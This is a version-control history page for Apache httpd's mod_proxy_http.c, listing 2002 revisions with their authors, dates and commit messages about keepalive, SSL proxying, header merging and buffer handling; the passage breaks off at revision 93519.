([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95891&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95891))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95891)

Modified
*Wed Jun 26 19:45:07 2002 UTC*
(22 years, 7 months ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95891)

File length: 44848 byte(s)

Diff to [previous 95854](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95854&r2=95891)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95854&r2=95891&diff_format=h))
```
Change conn_rec->keepalive to an enumerated value of

AP_CONN_UNKNOWN
AP_CONN_CLOSE
AP_CONN_KEEPALIVE

This also fixes a problem where ap_discard_request_body would not discard
the body when keepalive was 0.  This actually meant the keepalive status
was unknown *not* closed, but no one ever remembered that.

This problem was seen with mod_dav sending error responses (as reported by
Karl Fogel).

Suggested by:	Greg "this isn't the '80s" Stein
Reviewed by:	Greg Ames

```

---

Revision [**95854**](/viewvc?view=revision&revision=95854) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95854&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95854&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95854))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95854)

Modified
*Sun Jun 23 06:06:25 2002 UTC*
(22 years, 7 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95854)

File length: 44812 byte(s)

Diff to [previous 95674](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95674&r2=95854)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95674&r2=95854&diff_format=h))
```

  No crutches, people!

```

---

Revision [**95674**](/viewvc?view=revision&revision=95674) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95674&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95674&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95674))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95674)

Modified
*Fri Jun 14 17:14:57 2002 UTC*
(22 years, 7 months ago)
by *wrowe*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95674)

File length: 44835 byte(s)

Diff to [previous 95456](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95456&r2=95674)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95456&r2=95674&diff_format=h))
```

  Cleanup proxy timeouts a bit to remove emits and make consistent to
  vhost timeout.

```

---

Revision [**95456**](/viewvc?view=revision&revision=95456) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95456&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95456&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95456))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95456)

Modified
*Fri May 31 21:21:10 2002 UTC*
(22 years, 8 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95456)

File length: 44821 byte(s)

Diff to [previous 95394](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95394&r2=95456)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95394&r2=95456&diff_format=h))
```
add 2 new enviornment variables to deal with misbehaving backends
"proxy-nokeepalive" which removes the Connection: line completely
"force-proxy-request-1.0" which forces the request to be HTTP/1.0
this allows apache to reverse proxy misbehaving appservers

```

---

Revision [**95394**](/viewvc?view=revision&revision=95394) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95394&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95394&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95394))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95394)

Modified
*Thu May 30 07:33:59 2002 UTC*
(22 years, 8 months ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95394)

File length: 44496 byte(s)

Diff to [previous 95390](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95390&r2=95394)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95390&r2=95394&diff_format=h))
```
Switch mod_proxy to using the brigade/filter calls directly rather than
the *_client_block calls.

```

---

Revision [**95390**](/viewvc?view=revision&revision=95390) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95390&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95390&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95390))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95390)

Modified
*Thu May 30 07:04:45 2002 UTC*
(22 years, 8 months ago)
by *jerenkrantz*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95390)

File length: 44025 byte(s)

Diff to [previous 95150](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95150&r2=95390)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=95150&r2=95390&diff_format=h))
```
Add a PROXYREQ_RESPONSE value for request_rec->proxyreq because it is
possible that there can be different behavior at the protocol level if
request_rec isn't really a request but a response.

This stems from the fact that request bodies must be indicated by
Content-Length or Transfer-Encoding, but response bodies do not.  The
recent change to ap_http_filter to return EOS if there isn't a body broke
proxy.  Therefore, there must be some way for the proxy to indicate that
this is a response.  Accordingly, ap_http_filter can allow the BODY_NONE
iff this is a response.

Since r->proxyreq is set to PROXYREQ_PROXY even for the original request
from the client, that value isn't sufficient.  Hence, the introduction of
PROXYREQ_RESPONSE.

```

---

Revision [**95150**](/viewvc?view=revision&revision=95150) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95150&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=95150&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=95150))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=95150)

Modified
*Fri May 17 11:24:17 2002 UTC*
(22 years, 8 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=95150)

File length: 43885 byte(s)

Diff to [previous 94811](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94811&r2=95150)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94811&r2=95150&diff_format=h))
```
stop using APLOG_NOERRNO in calls to ap_log_[pr]error()

```

---

Revision [**94811**](/viewvc?view=revision&revision=94811) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94811&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94811&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94811))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94811)

Modified
*Fri Apr 26 12:29:38 2002 UTC*
(22 years, 9 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94811)

File length: 44165 byte(s)

Diff to [previous 94574](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94574&r2=94811)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94574&r2=94811&diff_format=h))
```
get basic HTTP proxy working on EBCDIC machines

(I would bet that there is more work to do throughout proxy, but at least
it can serve some pages now)

```

---

Revision [**94574**](/viewvc?view=revision&revision=94574) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94574&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94574&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94574))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94574)

Modified
*Tue Apr 9 09:39:04 2002 UTC*
(22 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94574)

File length: 43916 byte(s)

Diff to [previous 94544](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94544&r2=94574)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94544&r2=94574&diff_format=h))
```
Proxy was bombing out every second keepalive request, caused by a
stray CRLF before the second response's status line. Proxy now
tries to read one more line if it encounters a CRLF where it
expected a status.
PR: 10010
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**94544**](/viewvc?view=revision&revision=94544) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94544&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94544&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94544))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94544)

Modified
*Mon Apr 8 18:38:56 2002 UTC*
(22 years, 9 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94544)

File length: 43771 byte(s)

Diff to [previous 94515](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94515&r2=94544)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94515&r2=94544&diff_format=h))
```
PR:
Obtained from:
Submitted by:	Daniel Lopez <daniel@covalent.net>
Reviewed by:	dougm, rbb
add optional fixup hook to proxy

```

---

Revision [**94515**](/viewvc?view=revision&revision=94515) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94515&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94515&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94515))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94515)

Modified
*Sun Apr 7 03:37:35 2002 UTC*
(22 years, 9 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94515)

File length: 43746 byte(s)

Diff to [previous 94459](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94459&r2=94515)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94459&r2=94515&diff_format=h))
```
fix ProxyPass when frontend is https and backend is http

```

---

Revision [**94459**](/viewvc?view=revision&revision=94459) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94459&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94459&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94459))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94459)

Modified
*Fri Apr 5 18:08:07 2002 UTC*
(22 years, 9 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94459)

File length: 43620 byte(s)

Diff to [previous 94383](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94383&r2=94459)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94383&r2=94459&diff_format=h))
```
PR:
Obtained from:
Submitted by:
Reviewed by:    Ryan Bloom
remove flush bucket from ap_proxy_http_process_response.
this allows for the response content-length header to be properly
calculated/inserted.

```

---

Revision [**94383**](/viewvc?view=revision&revision=94383) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94383&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94383&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94383))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94383)

Modified
*Tue Apr 2 04:30:49 2002 UTC*
(22 years, 10 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94383)

File length: 43903 byte(s)

Diff to [previous 94333](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94333&r2=94383)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94333&r2=94383&diff_format=h))
```
PR:
Obtained from:
Submitted by:
Reviewed by:	Ryan Bloom
remove call to ap_proxy_reset_output_filters() and the function itself.
this call breaks ssl proxy when the client is using keepalives.
this function is also no longer needed with recent-ish filter changes.

```

---

Revision [**94333**](/viewvc?view=revision&revision=94333) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94333&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94333&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94333))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94333)

Modified
*Sat Mar 30 06:19:14 2002 UTC*
(22 years, 10 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94333)

File length: 43995 byte(s)

Diff to [previous 94313](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94313&r2=94333)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94313&r2=94333&diff_format=h))
```
ap_proxy_http_request needs to check the return status of ap_pass_brigade

```

---

Revision [**94313**](/viewvc?view=revision&revision=94313) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94313&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94313&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94313))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94313)

Modified
*Fri Mar 29 17:48:28 2002 UTC*
(22 years, 10 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94313)

File length: 43417 byte(s)

Diff to [previous 94304](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94304&r2=94313)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94304&r2=94313&diff_format=h))
```
check the return value of ap_proxy_ssl_enable

```

---

Revision [**94304**](/viewvc?view=revision&revision=94304) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94304&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94304&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94304))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94304)

Modified
*Fri Mar 29 08:17:26 2002 UTC*
(22 years, 10 months ago)
by *jwoolley*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94304)

File length: 43169 byte(s)

Diff to [previous 94300](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94300&r2=94304)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94300&r2=94304&diff_format=h))
```
BUCKET FREELISTS

Add an allocator-passing mechanism throughout the bucket brigades API.

From Apache's standpoint, the apr_bucket_alloc_t* used throughout a given
connection is stored in the conn_rec by the create_connection hook.  That
means it's the MPM's job to optimize recycling of apr_bucket_alloc_t's --
the MPM must ensure that no two threads can ever use the same one at the
same time, for instance.

```

---

Revision [**94300**](/viewvc?view=revision&revision=94300) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94300&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94300&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94300))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94300)

Modified
*Fri Mar 29 07:29:11 2002 UTC*
(22 years, 10 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94300)

File length: 42876 byte(s)

Diff to [previous 94083](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94083&r2=94300)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94083&r2=94300&diff_format=h))
```
hook into mod_ssl for https support

```

---

Revision [**94083**](/viewvc?view=revision&revision=94083) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94083&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94083&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94083))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94083)

Modified
*Thu Mar 21 12:05:45 2002 UTC*
(22 years, 10 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94083)

File length: 42374 byte(s)

Diff to [previous 94056](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94056&r2=94083)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94056&r2=94083&diff_format=h))
```
Change the header merging behaviour in proxy, as some headers
(like Set-Cookie) cannot be unmerged due to stray commas in
dates.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**94056**](/viewvc?view=revision&revision=94056) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94056&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94056&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94056))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94056)

Modified
*Wed Mar 20 17:41:55 2002 UTC*
(22 years, 10 months ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94056)

File length: 42595 byte(s)

Diff to [previous 94027](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94027&r2=94056)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=94027&r2=94056&diff_format=h))
```
Commit 1 of 2 to:
1. rename ap_rset_content_type to ap_set_content_type
2. reverse the arguments on the call to aligh with ap_set_content_length

```

---

Revision [**94027**](/viewvc?view=revision&revision=94027) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94027&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=94027&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=94027))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=94027)

Modified
*Wed Mar 20 01:58:47 2002 UTC*
(22 years, 10 months ago)
by *stoddard*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=94027)

File length: 42596 byte(s)

Diff to [previous 93918](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93918&r2=94027)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93918&r2=94027&diff_format=h))
```
First commit to introduce accessor function to set r->content_type..

```

---

Revision [**93918**](/viewvc?view=revision&revision=93918) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93918&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93918&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93918))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93918)

Modified
*Wed Mar 13 20:48:07 2002 UTC*
(22 years, 10 months ago)
by *fielding*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93918)

File length: 42589 byte(s)

Diff to [previous 93811](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93811&r2=93918)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93811&r2=93918&diff_format=h))
```
Update our copyright for this year.

```

---

Revision [**93811**](/viewvc?view=revision&revision=93811) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93811&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93811&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93811))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93811)

Modified
*Sat Mar 9 07:15:33 2002 UTC*
(22 years, 10 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93811)

File length: 42589 byte(s)

Diff to [previous 93787](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93787&r2=93811)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93787&r2=93811&diff_format=h))
```
New directive ProxyIOBufferSize. Sets the size of the buffer used
when reading from a remote HTTP server in proxy.

Modify receive/send loop in proxy_http and proxy_ftp so that
should it be necessary, the remote server socket is closed before
transmitting the last buffer (set by ProxyIOBufferSize) to the
client. This prevents the backend server from being forced to hang
around while the last few bytes are transmitted to a slow client.
Fix the case where no error checking was performed on the final
brigade in the loop.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**93787**](/viewvc?view=revision&revision=93787) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93787&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93787&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93787))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93787)

Modified
*Fri Mar 8 02:03:47 2002 UTC*
(22 years, 10 months ago)
by *trawick*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93787)

File length: 41354 byte(s)

Diff to [previous 93784](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93784&r2=93787)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93784&r2=93787&diff_format=h))
```
implement a common function for getting a socket and trying to connect
to the target host; use that common function for proxy HTTP and proxy
CONNECT

In that new function, fix this problem:

     Proxy HTTP and CONNECT: Keep trying other addresses from the DNS
     when we can't get a socket in the specified address family.  We may
     have gotten back an IPv6 address first and yet our system is not
     configured to allow IPv6 sockets.

An example host is www.ipv6.org.  The first address I get back is
an IPv6 address, but my machine may not be configured to allow an
AF_INET6 socket.

Before the fix: The apr_socket() failure was fatal.
After the fix:  When apr_socket() fails, we go to the next address from
                the resolver, successfully create a socket in the
                specified family (AF_INET), and all is well.

(an unrelated fix in this commit was to pass a server_rec in a broken
ap_log_error() call)

```

---

Revision [**93784**](/viewvc?view=revision&revision=93784) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93784&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93784&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93784))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93784)

Modified
*Thu Mar 7 23:40:03 2002 UTC*
(22 years, 10 months ago)
by *dougm*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93784)

File length: 43703 byte(s)

Diff to [previous 93527](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93527&r2=93784)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93527&r2=93784&diff_format=h))
```
fix typo in ap_proxy_http_canon: s/https:/https/

```

---

Revision [**93527**](/viewvc?view=revision&revision=93527) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93527&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93527&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93527))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93527)

Modified
*Thu Feb 21 06:06:31 2002 UTC*
(22 years, 11 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=93527)

File length: 43704 byte(s)

Diff to [previous 93519](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93519&r2=93527)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=93519&r2=93527&diff_format=h))
```
Some browsers ignore cookies that have been merged into a
single Set-Cookie header. Set-Cookie and Set-Cookie2 headers
are now unmerged in the http proxy before being sent to the
client.
Fix a problem with proxy where each entry of a duplicated
header such as Set-Cookie would overwrite and obliterate the
previous value of the header, resulting in multiple header
values (like cookies) going missing.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**93519**](/viewvc?view=revision&revision=93519) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93519&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=93519&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=93519))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=93519)

Modified
